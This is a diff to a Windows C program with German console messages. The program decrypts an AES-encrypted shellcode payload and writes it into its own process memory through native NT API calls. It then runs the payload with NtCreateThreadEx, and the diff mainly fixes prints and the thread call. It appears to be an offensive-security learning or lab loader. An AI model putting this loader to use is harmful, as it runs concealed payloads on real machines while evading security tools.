@@ -230,7 +230,7 @@ int main() {
     pNtFreeVirtualMemory NtFreeVirtualMem = (pNtFreeVirtualMemory)
         GetProcAddress(ntdll, "NtFreeVirtualMemory");
 
-    pNtCreateThreadEx NtCreateThread = (pNtCreateThreadEx)
+    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)
         GetProcAddress(ntdll, "NtCreateThreadEx");
 
     if (!NtAllocateVirtualMem) {
@@ -259,14 +259,14 @@ int main() {
     printf("[i] Injiziere Shellcode in die Lokale Adresse von PID: %d \n", GetCurrentProcessId());
     getchar();
 
-    printf("[#] Drueke Enter um shellcode zu Entschlüsseln");
+    printf("[#] Drueke Enter um shellcode zu Entschlüsseln\n");
     getchar();
 
     printf("Entschluesseln...");
     if (!SimpleDecryption(AesCipherText, sCipherSize, AesKey, AesIv, (PVOID*)&pDeobfuscatedPayload, (DWORD*)&sCipherSize)) {
-        printf("Enschlüsselung fehlgeschlagen");
+        printf("Enschlüsselung fehlgeschlagen\n");
     }
-    printf("Druecke Enter um Speicher zu allokieren");
+    printf("Druecke Enter um Speicher zu allokieren\n");
     getchar();
 
     NTSTATUS status;
@@ -286,7 +286,7 @@ int main() {
     }
 
     printf("Shellcode sitzt an Adresse 0x%p\n", base);
-    printf("Druecke Enter um in den Speicher zu schreiben");
+    printf("Druecke Enter um in den Speicher zu schreiben\n");
     getchar();
 
     status = NtWriteVirtualMem(
@@ -324,7 +324,7 @@ int main() {
 
     HANDLE hThread = NULL;
 
-    status = NtCreateThread(
+    status = NtCreateThreadEx(
         &hThread,
         THREAD_ALL_ACCESS,
         NULL,
@@ -341,14 +341,8 @@ int main() {
     if (!NT_SUCCESS(status)){
         printf("NtCreateThread Fehlgeschlagen: 0x%08X\n", status);
         return -1;
-        }
+    }
 
-
-
-
-
-
-
-
+    WaitForSingleObject(hThread, INFINITE);
 
 }
